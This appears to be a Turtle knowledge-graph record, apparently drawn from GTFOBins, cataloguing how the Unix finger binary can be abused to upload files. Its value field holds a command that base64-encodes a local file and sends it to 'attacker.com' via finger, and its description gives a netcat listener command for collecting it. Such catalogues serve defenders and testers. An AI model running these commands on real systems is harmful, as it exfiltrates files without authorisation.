    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Send a binary file to a TCP port. Run `sudo nc -l -p 79 | base64 -d > \"file_to_save\"` on the attacker box to collect the file. The file length is limited by the maximum size of arguments." ;
    d3f:uses mknd:executable_finger ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_finger ;
    mknd:provides mknd:function_file-upload ;
    mknd:value """RHOST=attacker.com
LFILE=file_to_send
finger "$(base64 $LFILE)@$RHOST"
""" .

